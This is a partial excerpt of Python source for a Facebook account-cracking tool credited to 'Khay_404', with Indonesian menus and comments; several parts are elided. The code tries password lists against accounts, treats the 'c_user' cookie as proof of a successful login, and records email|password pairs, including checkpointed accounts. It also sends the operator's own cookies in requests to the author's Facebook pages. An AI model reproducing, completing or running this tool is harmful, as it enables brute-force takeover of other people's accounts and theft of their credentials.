...
# Pilih Metode Crack coded by Khay_404 
def tanya_metode():
    while True:
        try:
            print(Panel("""[bold green]1[bold white]. Gunakan Metode ([bold green]Retas via Messenger[bold white])
[bold green]2[bold white]. Gunakan Metode ([bold yellow]Retas Via FB biasa[bold white])""", width=47, style="bold white"))
        ...
        for password in pwx:
            with requests.Session() as r:
                ...
                if 'c_user' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold green]MANTAP LOGIN SUCCESS", style="bold white"))
        ...
        for password in pwx:
            with requests.Session() as r:
                ...
                if 'c_user' in r.cookies.get_dict():
                    ...
                    tree = Tree(Panel.fit("[bold red]INI LOGIN CHECKPOINT", style="bold white"))
                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Cp.append(f'{email}|{password}')
...
───╔═╝║───────────╔═╝║
───╚══╝───────────╚══╝
\t   [underline blue]Coded by Khay_404""", width=47, title="Version 2.5 PREMIUM", style="bold white")) # JANGAN DIGANTI.!!
    try:
        ...
        if token.lower() == 'get' or 'get' in str(token.lower()):
            print("[bold white][[bold green]*[bold white]][bold green] Kamu Akan Diarahkan Ke Youtube!");os.system('xdg-open https://youtube.com/@khay404');time.sleep(2.5);break
        else:
            ...
            try:
                ...
                response = requests.get('https://mbasic.facebook.com/khay.adw', headers = {'cookie': cookies}).text # Jangan Di Ganti
                ...
                response2 = requests.get('https://m.facebook.com/photo.php/?fbid=2040300086358617', headers = {'cookie': cookies}).text # Jangan Di Ganti
                data = {
